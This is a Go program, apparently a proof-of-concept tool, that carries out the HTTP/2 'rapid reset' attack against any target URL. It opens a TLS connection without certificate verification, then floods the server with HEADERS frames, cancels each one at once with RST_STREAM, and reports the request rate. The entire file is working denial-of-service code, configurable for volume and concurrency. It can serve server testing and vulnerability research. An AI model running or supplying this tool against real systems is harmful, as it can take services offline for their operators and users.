package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"math"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var numRequests int
var concurrencyLimit int
var serverURLStr string
var streamCounter uint32
var waitTime int
var delayTime int
var sentHeaders, sentRSTs, recvFrames int32
var headerStart, headerEnd time.Time

// Accept command line arguments
func init() {
	flag.IntVar(&numRequests, "requests", 5, "Number of requests to send")
	flag.StringVar(&serverURLStr, "url", "https://localhost:443", "Server URL")
	flag.IntVar(&waitTime, "wait", 0, "Wait time in milliseconds between starting workers")
	flag.IntVar(&delayTime, "delay", 0, "Delay in milliseconds between sending HEADERS and RST_STREAM")
	flag.IntVar(&concurrencyLimit, "concurrency", 0, "Maximum number of concurrent worker routines")
	flag.Parse()
}

// HPACK headers, write HEADERS to server, and send RST_STREAM
func sendRequest(framer *http2.Framer, writeLock *sync.Mutex, path string, serverURL *url.URL, delay int, doneChan chan<- struct{}) {
	defer func() {
		doneChan <- struct{}{} // Signal that this worker is done
	}()

	var headerBlock bytes.Buffer

	// Encode headers
	encoder := hpack.NewEncoder(&headerBlock)

	encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: serverURL.Host})

	streamID := atomic.AddUint32(&streamCounter, 2) // Increment streamCounter and allocate stream ID in units of two to ensure stream IDs are odd numbered per RFC 9113

	writeLock.Lock()
	err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: headerBlock.Bytes(),
		EndStream:     true,
		EndHeaders:    true,
	})
	writeLock.Unlock()

	if err != nil {
		fmt.Printf("[%d] Failed to send HEADERS: %s", streamID, err)
	} else {
		atomic.AddInt32(&sentHeaders, 1)
		fmt.Printf("[%d] Sent HEADERS on stream %d\n", streamID, streamID)
	}

	// Sleep for several ms before sending RST_STREAM
	time.Sleep(time.Millisecond * time.Duration(delay))

	writeLock.Lock()
	err = framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
	writeLock.Unlock()

	if err != nil {
		fmt.Printf("[%d] Failed to send RST_STREAM: %s", streamID, err)
	} else {
		atomic.AddInt32(&sentRSTs, 1)
		fmt.Printf("[%d] Sent RST_STREAM on stream %d\n", streamID, streamID)
	}

}

// Print a pretty summary before exiting
func printSummary() {
	elapsed := headerEnd.Sub(headerStart).Seconds()
	fmt.Printf("\n--- Summary ---\n")
	fmt.Printf("Frames sent: HEADERS = %d, RST_STREAM = %d\n", sentHeaders, sentRSTs)
	fmt.Printf("Frames received: %d\n", recvFrames)
	fmt.Printf("Total time: %.2f seconds (%d rps)\n\n", elapsed, int(math.Round(float64(sentHeaders)/elapsed)))
}

func main() {
	serverURL, err := url.Parse(serverURLStr)
	if err != nil {
		log.Fatalf("Failed to parse URL: %v", err)
	}

	headerStart = time.Now()
	streamCounter = 1

	// Establish TLS with server and ignore certificate
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
	}

	conn, err := tls.Dial("tcp", serverURL.Host, tlsConfig)
	if err != nil {
		log.Fatalf("Failed to dial: %s", err)
	}

	_, err = conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
	if err != nil {
		log.Fatalf("Failed to send client preface: %s", err)
	}

	// Initialize HTTP2 framer and read/writeLock
	framer := http2.NewFramer(conn, conn)
	var writeLock sync.Mutex
	var readLock sync.Mutex

	// Send initial SETTINGS frame
	writeLock.Lock()
	if err := framer.WriteSettings(); err != nil {
		log.Fatalf("Failed to write settings: %s", err)
	}
	writeLock.Unlock()

	// Wait for SETTINGS frame from server
	for {
		readLock.Lock()
		frame, err := framer.ReadFrame()
		readLock.Unlock()

		if err != nil {
			fmt.Printf("Failed to read frame: %s", err)
		}
		if frame.Header().Type == http2.FrameSettings {
			fmt.Print("got initial SETTINGS frame")
			break
		}
	}

	// Read and count received frames, print to stdout
	go func() {
		for {
			readLock.Lock()
			frame, err := framer.ReadFrame()
			readLock.Unlock()

			if err != nil {
				if err == io.EOF {
					return
				}
				fmt.Printf("Failed to read frame: %s", err)
			} else {
				atomic.AddInt32(&recvFrames, 1)
				fmt.Printf("Received frame: %v\n", frame)
			}
		}
	}()

	path := serverURL.Path
	if path == "" {
		path = "/"
	}

	// Create a buffered channel to control concurrency
	concurrency := concurrencyLimit
	doneChan := make(chan struct{}, concurrency)

	// Send requests
	for i := 0; i < numRequests; i++ {
		time.Sleep(time.Millisecond * time.Duration(waitTime))
		go sendRequest(framer, &writeLock, path, serverURL, delayTime, doneChan)
	}

	// Wait for all workers to finish
	for i := 0; i < numRequests; i++ {
		<-doneChan
	}

	headerEnd = time.Now()

	printSummary()
}
